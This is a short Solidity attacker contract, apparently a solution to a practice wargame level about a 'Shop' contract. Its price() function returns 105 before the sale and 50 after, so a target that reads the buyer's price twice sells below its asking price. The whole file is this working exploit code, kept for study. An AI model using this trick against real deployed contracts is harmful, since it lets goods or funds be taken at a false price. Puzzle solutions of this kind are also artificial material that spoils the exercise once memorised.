// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IShop{ // 1) change interface name

    function buy() external;
    function isSold()  external view returns (bool);
    function price()  external view returns (uint256);
}

contract ShopAttack { // 2) change nameattck

    IShop shopContract;

    constructor(address _target) {

        shopContract = IShop(_target);
    }

    function attack() external {

        shopContract.buy();
    }

    function price() external view returns (uint256) {

        if (!shopContract.isSold())
            return 105;
        
        else
            return 50;
    }
}